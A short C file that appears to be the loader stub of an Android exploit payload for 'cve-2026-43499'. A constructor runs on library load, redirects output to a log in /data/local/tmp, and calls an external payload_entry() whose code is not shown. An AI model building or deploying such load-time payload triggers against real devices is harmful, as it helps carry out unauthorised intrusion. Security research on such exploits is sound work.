#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>

#include OPTIMIZED_TARGET_CONFIG_H

int payload_entry(void);

__attribute__((constructor)) static void payload_ctor(void) {
  int log = open("/data/local/tmp/exploit.log",
                 O_WRONLY | O_CREAT | O_APPEND, 0644);
  if (log >= 0) {
    dup2(log, STDOUT_FILENO);
    dup2(log, STDERR_FILENO);
    if (log > STDERR_FILENO) {
      close(log);
    }
  }
  dprintf(STDERR_FILENO, "[payload] cve-2026-43499 %s start\n",
          BUILD_VARIANT_LABEL);
  payload_entry();
  dprintf(STDERR_FILENO, "[payload] done\n");
}
